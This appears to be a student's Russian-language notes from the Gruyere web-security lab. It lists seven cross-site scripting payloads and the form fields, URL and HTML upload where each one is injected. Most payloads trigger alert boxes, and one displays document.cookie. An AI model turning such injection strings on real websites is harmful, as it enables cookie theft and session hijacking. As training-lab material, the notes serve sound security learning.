# Payloads для gruyere
## Payload 1
На странице редактирования профиля в поле ввода Icon можно вставить строку `'' onerror="alert(23)"`
## Payload 2
На странице редактирования профиля в поле ввода homepage можно вставить строку `' onmouseover="alert(32)"`
## Payload 3
На странице редактирования профиля в поле ввода profile color можно вставить строку `; font-size:1000px;"' onmouseover="alert('xss')"`
## Payload 4
На главной странице в конец url можно вставить `<script>alert(41)</script>` для вызова кастомного скрипта
## Payload 5
На странице создания нового сниппета ввести в поле ввода `< style="background-color:red; width:500px; height:500px; display:block;" onmouseover="alert('xss')" >`
## Payload 6
На странице редактирования профиля ввести в поле ввода private snippet `< style="background-color:red; width:500px; height:500px; display:block;" onmouseover="alert('xss')" >`
## Payload 7
На странице Upload вставить в поле ввода файл *.html, содержащий в себе `<script>alert(document.cookie)</script>`
...
